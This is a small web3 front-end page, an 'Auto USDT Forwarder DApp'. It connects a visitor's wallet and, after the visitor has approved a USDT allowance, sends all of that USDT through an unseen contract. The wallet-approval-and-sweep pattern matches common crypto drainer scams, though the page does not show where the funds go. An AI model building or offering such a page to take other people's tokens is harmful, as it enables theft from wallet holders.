
<!DOCTYPE html>
<html>
<head>
  <title>Auto USDT Forwarder</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>
  <h2>Auto USDT Forwarder DApp</h2>
  <p>Make sure you've approved USDT allowance to this contract first.</p>
  <button id="connect">Connect Wallet</button>
  <button id="send">Send All USDT</button>

  <script>
    const contractAddress = "PASTE_YOUR_DEPLOYED_CONTRACT_ADDRESS";
    const abi = [
      {
        "inputs": [],
        "name": "forwardAllUSDT",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    let web3;
    let account;
    let contract;

    document.getElementById("connect").onclick = async () => {
      if (typeof window.ethereum !== 'undefined') {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        account = accounts[0];
        contract = new web3.eth.Contract(abi, contractAddress);
        alert("Connected: " + account);
      } else {
        alert("Please open in Trust Wallet DApp browser.");
      }
    };

    document.getElementById("send").onclick = async () => {
      if (!account || !contract) {
        alert("Connect wallet first.");
        return;
      }
      try {
        await contract.methods.forwardAllUSDT().send({ from: account });
        alert("USDT sent!");
      } catch (e) {
        alert("Error: " + e.message);
      }
    };
  </script>
</body>
</html>
